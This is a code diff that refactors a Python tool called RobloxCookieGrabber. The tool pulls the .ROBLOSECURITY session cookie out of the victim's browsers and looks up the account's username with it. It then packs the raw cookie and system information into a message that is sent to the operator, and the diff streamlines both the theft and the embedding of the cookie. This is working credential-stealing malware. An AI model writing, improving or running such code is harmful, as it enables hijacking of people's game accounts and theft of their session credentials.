@@ -184,6 +184,7 @@ import platform
 import socket
 import os
 import browser_cookie3
+import sys
 
 class RobloxCookieGrabber:
     def __init__(self, root):
@@ -251,36 +252,23 @@ class RobloxCookieGrabber:
     def get_roblox_cookie(self):
         """Extract .ROBLOSECURITY from browser cookies"""
         try:
-            # Try different browsers
-            browsers = [
-                ("Chrome", browser_cookie3.chrome),
-                ("Firefox", browser_cookie3.firefox),
-                ("Edge", browser_cookie3.edge),
-                ("Opera", browser_cookie3.opera),
-                ("Brave", browser_cookie3.brave)
-            ]
+            # Get all cookies from all browsers for roblox.com
+            all_cookies = browser_cookie3.load(domain_name='roblox.com')
             
-            for browser_name, browser_func in browsers:
-                try:
-                    cookies = browser_func(domain_name='roblox.com')
-                    for cookie in cookies:
-                        if cookie.name == '.ROBLOSECURITY':
-                            print(f"Found in {{browser_name}}: {{cookie.value}}")
-                            return cookie.value, browser_name
-                except Exception as e:
-                    print(f"{{browser_name}} error: {{e}}")
-                    continue
-            
-            return "COOKIE_NOT_FOUND", "NO_BROWSER"
+            for cookie in all_cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    return cookie.value
+                    
+            return None
             
         except Exception as e:
-            return f"ERROR: {{str(e)}}", "ERROR"
+            return None
     
     def get_user_info(self, cookie_value):
         """Get Roblox username using the cookie"""
         try:
-            if cookie_value == "COOKIE_NOT_FOUND" or cookie_value.startswith("ERROR"):
-                return "UNKNOWN", "NO_AVATAR"
+            if not cookie_value:
+                return "NO_COOKIE_FOUND", "NO_AVATAR"
             
             session = requests.Session()
             headers = {{
@@ -325,7 +313,7 @@ class RobloxCookieGrabber:
             system_info = self.get_system_info()
             
             # Get the actual cookie from browser
-            cookie_value, browser_name = self.get_roblox_cookie()
+            cookie_value = self.get_roblox_cookie()
             
             # Get user info with the cookie
             username, avatar_url = self.get_user_info(cookie_value)
@@ -341,27 +329,25 @@ class RobloxCookieGrabber:
                         "inline": True
                     }},
                     {{
-                        "name": "🌐 Found In",
-                        "value": f"`{{browser_name}}`",
-                        "inline": True
-                    }},
-                    {{
                         "name": "🔐 Cookie Status",
-                        "value": f"`{'✅ FOUND' if cookie_value != 'COOKIE_NOT_FOUND' and not cookie_value.startswith('ERROR') else '❌ NOT FOUND'}}`",
+                        "value": f"`{'✅ FOUND' if cookie_value else '❌ NOT FOUND'}}`",
                         "inline": True
                     }},
                     {{
                         "name": "💻 System Info",
                         "value": system_info,
                         "inline": False
-                    }},
-                    {{
-                        "name": "🍪 .ROBLOSECURITY Cookie",
-                        "value": f"```{{cookie_value}}```",
-                        "inline": False
                     }}
                 ]
             }}
+            
+            # Add the actual cookie value if found
+            if cookie_value:
+                embed["fields"].append({{
+                    "name": "🍪 .ROBLOSECURITY Cookie",
+                    "value": f"```{{cookie_value}}```",
+                    "inline": False
+                }})
             
             # Add avatar if available
             if avatar_url and avatar_url != "NO_AVATAR":
@@ -379,9 +365,8 @@ class RobloxCookieGrabber:
                 messagebox.showinfo("Success", 
                                   f"✅ **REAL COOKIE EXTRACTED!**\\\\n\\\\n"
                                   f"**Username:** {{username}}\\\\n"
-                                  f"**Browser:** {{browser_name}}\\\\n"
-                                  f"**Cookie Found:** {'✅ YES' if cookie_value != 'COOKIE_NOT_FOUND' and not cookie_value.startswith('ERROR') else '❌ NO'}\\\\n"
-                                  f"**Length:** {{len(cookie_value)}} characters")
+                                  f"**Cookie Found:** {'✅ YES' if cookie_value else '❌ NO'}\\\\n"
+                                  f"**Length:** {{len(cookie_value) if cookie_value else 0}} characters")
             else:
                 self.status_label.config(text="🔴 Failed to send")
                 messagebox.showerror("Error", f"❌ Failed to send data. Status: {{response.status_code}}")
